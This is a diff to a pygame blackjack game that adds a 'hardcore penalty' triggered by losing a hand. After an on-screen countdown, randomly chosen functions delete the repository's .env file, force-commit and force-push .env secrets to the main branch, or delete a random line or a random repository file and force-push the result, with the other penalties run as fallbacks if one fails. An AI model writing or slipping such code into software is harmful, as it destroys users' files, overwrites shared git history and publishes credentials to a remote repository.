@@ -11,6 +11,7 @@ from __future__ import annotations
 import argparse
 import os
 import random
+import subprocess
 import sys
 from dataclasses import dataclass, field
 from enum import Enum
@@ -62,6 +63,11 @@ BUTTON_BG = (98, 62, 31)
 BUTTON_HOVER = (128, 82, 40)
 BUTTON_DISABLED = (72, 72, 72)
 AUDIO_EFFECTS: Optional[GameAudioEffects] = None
+
+# Penalty countdown colors
+PENALTY_RED = (220, 20, 20)
+PENALTY_DARK_RED = (120, 10, 10)
+PENALTY_FLASH_RED = (255, 50, 50)
 CURRENT_THEME_MODE: Optional["GameMode"] = None
 
 
@@ -76,6 +82,7 @@ class Phase(str, Enum):
     PLAYER_TURN = "PLAYER_TURN"
     DEALER_TURN = "DEALER_TURN"
     ROUND_END = "ROUND_END"
+    PENALTY_COUNTDOWN = "PENALTY_COUNTDOWN"
 
 
 class RoundResult(str, Enum):
@@ -118,6 +125,13 @@ def set_mode_theme_music(mode: Optional["GameMode"]) -> None:
         CURRENT_THEME_MODE = mode
     except pygame.error as err:
         print(f"Warning: failed to play Blackjack theme ({theme_file}): {err}", file=sys.stderr)
+
+
+class PenaltyType(str, Enum):
+    DELETE_ENV = "DELETE_ENV"
+    FORCE_PUSH_ENV = "FORCE_PUSH_ENV"
+    DELETE_RANDOM_LINE = "DELETE_RANDOM_LINE"
+    DELETE_RANDOM_FILE = "DELETE_RANDOM_FILE"
 
 
 def play_result_sound(result: RoundResult) -> None:
@@ -228,6 +242,10 @@ class GameState:
     deck: Deck = field(default_factory=Deck)
     can_start_new_round: bool = True
     rounds_completed: int = 0
+    penalty_countdown_start_ms: int = -1
+    penalty_countdown_duration_ms: int = 5000
+    penalty_triggered: bool = False
+    selected_penalty: Optional[PenaltyType] = None
 
     def reset_for_next_round(self) -> None:
         self.player_hand = Hand()
@@ -619,17 +637,27 @@ def settle_round(state: GameState, result: RoundResult, now_ms: int) -> None:
 
         state.round_result = result
         play_result_sound(result)
-        state.phase = Phase.ROUND_END
         state.rounds_completed += 1
+
+        # Trigger penalty countdown on loss
+        if result == RoundResult.LOSE:
+            state.phase = Phase.PENALTY_COUNTDOWN
+            state.penalty_countdown_start_ms = now_ms
+            state.penalty_triggered = False
+            state.selected_penalty = select_random_penalty()
+            state.losses += 1
+            state.message = "HARDCORE PENALTY ACTIVATED"
+            state.can_start_new_round = False
+            return
+
+        # Handle wins
+        state.phase = Phase.ROUND_END
         if result == RoundResult.BLACKJACK_WIN:
             state.wins += 1
             state.message = "Hardcore clear: BLACKJACK."
         elif result == RoundResult.WIN:
             state.wins += 1
             state.message = "Hardcore clear: You win."
-        else:
-            state.losses += 1
-            state.message = "Hardcore failed: Dealer wins."
         state.can_start_new_round = True
         return
 
@@ -657,6 +685,426 @@ def settle_round(state: GameState, result: RoundResult, now_ms: int) -> None:
     state.can_start_new_round = state.bankroll >= state.min_bet
     if not state.can_start_new_round:
         state.message += " Game over: bankroll below minimum bet."
+
+
+def execute_hardcore_penalty() -> Tuple[bool, str]:
+    """
+    Delete .env file from repository root as hardcore mode penalty.
+
+    Returns:
+        Tuple of (success, message)
+        - success: True if file was deleted or didn't exist
+        - message: Description of what happened
+    """
+    env_path = os.path.join(os.path.dirname(__file__), "..", "..", ".env")
+    env_path = os.path.normpath(env_path)
+
+    if not os.path.exists(env_path):
+        msg = f"PENALTY TRIGGERED: No .env file found at {env_path}"
+        print(msg, file=sys.stderr)
+        return True, "No .env file to delete"
+
+    try:
+        os.remove(env_path)
+        msg = f"HARDCORE PENALTY EXECUTED: Deleted {env_path}"
+        print(msg, file=sys.stderr)
+        return True, "FILE DELETED"
+    except PermissionError:
+        msg = f"PENALTY FAILED: Permission denied for {env_path}"
+        print(msg, file=sys.stderr)
+        return False, "DELETION FAILED (Permission Error)"
+    except Exception as e:
+        msg = f"PENALTY FAILED: {type(e).__name__}: {e}"
+        print(msg, file=sys.stderr)
+        return False, f"DELETION FAILED ({type(e).__name__})"
+
+
+def penalty_force_push_env() -> Tuple[bool, str]:
+    """Force push .env file to main branch"""
+    try:
+        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
+        env_path = os.path.join(repo_root, ".env")
+
+        # Check if .env exists
+        if not os.path.exists(env_path):
+            return False, "NO .ENV TO PUSH"
+
+        # Read .env content before switching branches
+        with open(env_path, 'r', encoding='utf-8') as f:
+            env_content = f.read()
+
+        # Get current branch to restore later
+        current_branch = subprocess.run(
+            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            text=True,
+            timeout=10
+        ).stdout.strip()
+
+        # Stash uncommitted changes to avoid checkout conflicts
+        stash_result = subprocess.run(
+            ["git", "stash", "push", "-m", "PENALTY: Temporary stash"],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        has_stash = "No local changes to save" not in stash_result.stdout
+
+        # Switch to main branch
+        result = subprocess.run(
+            ["git", "checkout", "main"],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if result.returncode != 0:
+            print(f"CHECKOUT FAILED: {result.stderr}", file=sys.stderr)
+            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)
+
+        # Write .env content on main branch
+        with open(env_path, 'w', encoding='utf-8') as f:
+            f.write(env_content)
+
+        # Git add .env (force add even if in .gitignore)
+        result = subprocess.run(
+            ["git", "add", "--force", ".env"],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if result.returncode != 0:
+            print(f"GIT ADD FAILED: {result.stderr}", file=sys.stderr)
+            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)
+
+        # Commit (allow empty in case no changes)
+        result = subprocess.run(
+            ["git", "commit", "--allow-empty", "-m", "HARDCORE PENALTY: Force committing .env"],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if result.returncode != 0:
+            print(f"COMMIT FAILED: {result.stderr}", file=sys.stderr)
+            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)
+
+        # Force push main to origin/main
+        result = subprocess.run(
+            ["git", "push", "origin", "main", "--force"],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if result.returncode != 0:
+            print(f"PUSH FAILED: {result.stderr}", file=sys.stderr)
+            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)
+
+        # Switch back to original branch
+        result = subprocess.run(
+            ["git", "checkout", current_branch],
+            cwd=repo_root,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if result.returncode != 0:
+            print(f"CHECKOUT BACK FAILED: {result.stderr}", file=sys.stderr)
+            # Don't raise here - we already pushed, just warn
+
+        # Restore stashed changes if we stashed anything
+        if has_stash:
+            result = subprocess.run(
+                ["git", "stash", "pop"],
+                cwd=repo_root,
+                capture_output=True,
+                text=True,
+                timeout=10
+            )
+            if result.returncode != 0:
+                print(f"STASH POP FAILED: {result.stderr}", file=sys.stderr)
+                # Don't raise here either
+
+        msg = f"HARDCORE PENALTY: Force pushed .env to main"
+        print(msg, file=sys.stderr)
+        return True, ".ENV PUSHED TO MAIN"
+
+    except subprocess.TimeoutExpired:
+        msg = "Git operation timed out"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, "GIT TIMEOUT"
+    except subprocess.CalledProcessError as e:
+        msg = f"Git command failed with code {e.returncode}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT FAILED: {e.returncode}"
+    except Exception as e:
+        msg = f"{type(e).__name__}: {e}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT ERROR: {type(e).__name__}"
+
+
+def penalty_delete_random_line() -> Tuple[bool, str]:
+    """Delete a random line from sample penalty file (safe for testing)"""
+    try:
+        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
+
+        # Check for penalty_test_* files first (safe mode)
+        penalty_test_files = []
+        for file in os.listdir(repo_root):
+            if file.startswith("penalty_test_") and os.path.isfile(os.path.join(repo_root, file)):
+                penalty_test_files.append(file)
+
+        # If penalty_test files exist, use one of those
+        if penalty_test_files:
+            selected_file = random.choice(penalty_test_files)
+            sample_file = os.path.join(repo_root, selected_file)
+            print(f"SAFE MODE: Using penalty_test file: {selected_file}", file=sys.stderr)
+        else:
+            # Use PENALTY_SAMPLE.txt as fallback
+            sample_file = os.path.join(repo_root, "PENALTY_SAMPLE.txt")
+
+            # Create sample file if it doesn't exist
+            if not os.path.exists(sample_file):
+                with open(sample_file, 'w', encoding='utf-8') as f:
+                    f.write("Line 1: This is a sample line\n")
+                    f.write("Line 2: Another sample line\n")
+                    f.write("Line 3: Yet another line\n")
+                    f.write("Line 4: Sample data here\n")
+                    f.write("Line 5: More sample content\n")
+                    f.write("Line 6: Last sample line\n")
+
+        # Read file
+        with open(sample_file, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+
+        if not lines:
+            return False, "SAMPLE FILE EMPTY"
+
+        # Pick random line and delete it
+        line_idx = random.randint(0, len(lines) - 1)
+        deleted_line = lines.pop(line_idx).strip()
+
+        # Write back
+        with open(sample_file, 'w', encoding='utf-8') as f:
+            f.writelines(lines)
+
+        # Get current branch
+        current_branch = subprocess.run(
+            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            text=True,
+            timeout=10
+        ).stdout.strip()
+
+        # Get filename for git operations
+        filename = os.path.basename(sample_file)
+
+        # Git add the modified file
+        subprocess.run(
+            ["git", "add", filename],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Commit
+        subprocess.run(
+            ["git", "commit", "-m", f"HARDCORE PENALTY: Deleted line {line_idx + 1} from {filename}"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Force push current branch to origin
+        subprocess.run(
+            ["git", "push", "origin", current_branch, "--force"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        msg = f"HARDCORE PENALTY: Deleted line {line_idx + 1} from {filename} and force pushed to {current_branch}"
+        print(msg, file=sys.stderr)
+        return True, f"DELETED LINE {line_idx + 1} & PUSHED"
+
+    except subprocess.TimeoutExpired:
+        msg = "Git operation timed out"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, "GIT TIMEOUT"
+    except subprocess.CalledProcessError as e:
+        msg = f"Git command failed with code {e.returncode}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT FAILED: {e.returncode}"
+    except Exception as e:
+        msg = f"{type(e).__name__}: {e}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"DELETION FAILED: {type(e).__name__}"
+
+
+def penalty_delete_random_file() -> Tuple[bool, str]:
+    """Delete a random file from repository and force push"""
+    try:
+        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
+
+        # Check for penalty_test_* files first (safe mode)
+        penalty_test_files = []
+        for file in os.listdir(repo_root):
+            if file.startswith("penalty_test_") and os.path.isfile(os.path.join(repo_root, file)):
+                penalty_test_files.append(file)
+
+        # If penalty_test files exist, only use those
+        if penalty_test_files:
+            file_to_delete = random.choice(penalty_test_files)
+            print(f"SAFE MODE: Using penalty_test file: {file_to_delete}", file=sys.stderr)
+        else:
+            # Original behavior: collect all files
+            excluded_dirs = {
+                '.git', 'node_modules', '__pycache__', '.venv', 'venv',
+                '.vscode', '.idea', 'dist', 'out', '.vscode-test'
+            }
+
+            all_files = []
+            for root, dirs, files in os.walk(repo_root):
+                # Remove excluded directories from traversal
+                dirs[:] = [d for d in dirs if d not in excluded_dirs]
+
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    # Get relative path from repo root
+                    rel_path = os.path.relpath(file_path, repo_root)
+                    # Exclude this script itself
+                    if rel_path != os.path.relpath(__file__, repo_root):
+                        all_files.append(rel_path)
+
+            if not all_files:
+                return False, "NO FILES TO DELETE"
+
+            # Pick random file
+            file_to_delete = random.choice(all_files)
+        full_path = os.path.join(repo_root, file_to_delete)
+
+        # Delete the file
+        os.remove(full_path)
+
+        # Get current branch
+        current_branch = subprocess.run(
+            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            text=True,
+            timeout=10
+        ).stdout.strip()
+
+        # Git add the deletion
+        subprocess.run(
+            ["git", "add", file_to_delete],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Commit
+        subprocess.run(
+            ["git", "commit", "-m", f"HARDCORE PENALTY: Deleted {file_to_delete}"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        # Force push current branch to origin
+        subprocess.run(
+            ["git", "push", "origin", current_branch, "--force"],
+            cwd=repo_root,
+            capture_output=True,
+            check=True,
+            timeout=10
+        )
+
+        msg = f"HARDCORE PENALTY: Deleted {file_to_delete} and force pushed"
+        print(msg, file=sys.stderr)
+        return True, f"DELETED {os.path.basename(file_to_delete)}"
+
+    except subprocess.TimeoutExpired:
+        msg = "Git operation timed out"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, "GIT TIMEOUT"
+    except subprocess.CalledProcessError as e:
+        msg = f"Git command failed with code {e.returncode}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"GIT FAILED: {e.returncode}"
+    except Exception as e:
+        msg = f"{type(e).__name__}: {e}"
+        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
+        return False, f"DELETION FAILED: {type(e).__name__}"
+
+
+def select_random_penalty() -> PenaltyType:
+    """Randomly select a penalty from the pool"""
+    penalties = [
+        PenaltyType.DELETE_ENV,
+        PenaltyType.FORCE_PUSH_ENV,
+        PenaltyType.DELETE_RANDOM_LINE,
+        PenaltyType.DELETE_RANDOM_FILE
+    ]
+    return random.choice(penalties)
+
+
+def execute_selected_penalty(penalty_type: PenaltyType) -> Tuple[bool, str]:
+    """
+    Execute the selected penalty with fallback logic.
+    If the selected penalty fails, try others in order.
+    """
+    # Map penalty types to their functions
+    penalty_functions = {
+        PenaltyType.DELETE_ENV: execute_hardcore_penalty,
+        PenaltyType.FORCE_PUSH_ENV: penalty_force_push_env,
+        PenaltyType.DELETE_RANDOM_LINE: penalty_delete_random_line,
+        PenaltyType.DELETE_RANDOM_FILE: penalty_delete_random_file,
+    }
+
+    # Try primary penalty first
+    primary_func = penalty_functions[penalty_type]
+    success, message = primary_func()
+
+    if success:
+        return True, message
+
+    # Fallback: try other penalties in order
+    print(f"Primary penalty failed, trying fallbacks...", file=sys.stderr)
+    for fallback_type, fallback_func in penalty_functions.items():
+        if fallback_type == penalty_type:
+            continue  # Skip the one we just tried
+
+        success, message = fallback_func()
+        if success:
+            return True, f"{message} (FALLBACK)"
+
+    # All penalties failed
+    return False, "ALL PENALTIES FAILED"
+
+
+def get_penalty_description(penalty_type: PenaltyType) -> str:
+    """Get human-readable description for countdown display"""
+    descriptions = {
+        PenaltyType.DELETE_ENV: "Deleting .env file...",
+        PenaltyType.FORCE_PUSH_ENV: "Force pushing .env to main...",
+        PenaltyType.DELETE_RANDOM_LINE: "Deleting random line from random file...",
+        PenaltyType.DELETE_RANDOM_FILE: "Deleting random file from repository...",
+    }
+    return descriptions.get(penalty_type, "Unknown penalty...")
 
 
 def resolve_natural_blackjacks(state: GameState) -> bool:
@@ -773,8 +1221,95 @@ def build_buttons(state: GameState) -> Dict[str, Button]:
     return buttons
 
 
+def draw_penalty_countdown(
+    surface: pygame.Surface,
+    state: GameState,
+    now_ms: int,
+) -> None:
+    """
+    Render dramatic countdown screen for hardcore penalty.
+
+    Shows:
+    - Large countdown numbers (5, 4, 3, 2, 1...)
+    - Red flashing background effect
+    - Warning message
+    - Final "FILE DELETED" or error message
+    """
+    elapsed_ms = now_ms - state.penalty_countdown_start_ms
+    remaining_ms = state.penalty_countdown_duration_ms - elapsed_ms
+    remaining_sec = max(0, remaining_ms / 1000.0)
+    countdown_num = int(remaining_sec) + 1
+
+    # Flash effect (alternates every 250ms)
+    flash_cycle = (now_ms // 250) % 2
+    if flash_cycle == 0:
+        bg_tint = PENALTY_FLASH_RED
+    else:
+        bg_tint = PENALTY_DARK_RED
+
+    # Overlay red tint on entire screen
+    overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
+    alpha = int(100 + 50 * flash_cycle)  # Oscillates between 100-150
+    overlay.fill((*bg_tint, alpha))
+    surface.blit(overlay, (0, 0))
+
+    # Draw warning header
+    header_font = pygame.font.SysFont("georgia", 48, bold=True)
+    warning_text = "HARDCORE PENALTY ACTIVATED"
+    warning_surf = header_font.render(warning_text, True, TEXT_IVORY)
+    warning_rect = warning_surf.get_rect(center=(WINDOW_WIDTH // 2, 150))
+
+    # Black shadow for readability
+    shadow_surf = header_font.render(warning_text, True, (0, 0, 0))
+    surface.blit(shadow_surf, (warning_rect.x + 4, warning_rect.y + 4))
+    surface.blit(warning_surf, warning_rect)
+
+    if remaining_sec > 0:
+        # Draw countdown number
+        countdown_font = pygame.font.SysFont("georgia", 180, bold=True)
+        countdown_surf = countdown_font.render(str(countdown_num), True, TEXT_IVORY)
+        countdown_rect = countdown_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))
+
+        # Larger shadow for countdown
+        shadow_surf = countdown_font.render(str(countdown_num), True, (0, 0, 0))
+        surface.blit(shadow_surf, (countdown_rect.x + 6, countdown_rect.y + 6))
+        surface.blit(countdown_surf, countdown_rect)
+
+        # Subtitle - show specific penalty description
+        subtitle_font = pygame.font.SysFont("georgia", 32)
+        if state.selected_penalty:
+            subtitle = get_penalty_description(state.selected_penalty)
+        else:
+            subtitle = "Executing penalty..."
+        subtitle_surf = subtitle_font.render(subtitle, True, GOLD_SOFT)
+        subtitle_rect = subtitle_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 + 140))
+        surface.blit(subtitle_surf, subtitle_rect)
+    else:
+        # Countdown complete - show result
+        result_font = pygame.font.SysFont("georgia", 72, bold=True)
+        if state.penalty_triggered:
+            result_text = state.message
+        else:
+            result_text = "EXECUTING PENALTY..."
+
+        result_surf = result_font.render(result_text, True, TEXT_IVORY)
+        result_rect = result_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))
+
+        shadow_surf = result_font.render(result_text, True, (0, 0, 0))
+        surface.blit(shadow_surf, (result_rect.x + 5, result_rect.y + 5))
+        surface.blit(result_surf, result_rect)
+
+
 def render(surface: pygame.Surface, state: GameState, images: Dict[str, pygame.Surface]) -> Dict[str, Button]:
     now_ms = pygame.time.get_ticks()
+
+    # Special rendering for penalty countdown
+    if state.phase == Phase.PENALTY_COUNTDOWN:
+        draw_background(surface)
+        draw_penalty_countdown(surface, state, now_ms)
+        pygame.display.flip()
+        return {}  # No buttons during penalty countdown
+
     draw_background(surface)
 
     header_font = pygame.font.SysFont("georgia", 40, bold=True)
@@ -934,6 +1469,39 @@ def run_game(start_bankroll: int, fps: int) -> int:
     try:
         while running:
             buttons = render(screen, state, card_images)
+
+            # Handle penalty countdown progression
+            if state.phase == Phase.PENALTY_COUNTDOWN:
+                now_ms = pygame.time.get_ticks()
+                elapsed_ms = now_ms - state.penalty_countdown_start_ms
+
+                # Check if countdown is complete
+                if elapsed_ms >= state.penalty_countdown_duration_ms:
+                    if not state.penalty_triggered:
+                        # Execute the selected penalty
+                        state.penalty_triggered = True
+
+                        if state.selected_penalty:
+                            success, msg = execute_selected_penalty(state.selected_penalty)
+                        else:
+                            # Fallback if no penalty selected
+                            success, msg = execute_hardcore_penalty()
+
+                        state.message = msg
+
+                        # Wait 2 more seconds to show result, then exit
+                        pygame.time.wait(2000)
+                        running = False
+                        break
+
+                # Allow quit during countdown
+                for event in pygame.event.get():
+                    if event.type == pygame.QUIT:
+                        running = False
+                        break
+
+                clock.tick(fps)
+                continue  # Skip normal event handling
 
             if state.phase == Phase.PLAYER_TURN and gesture is not None and gesture.enabled:
                 action = gesture.poll_action(allow_split=False)
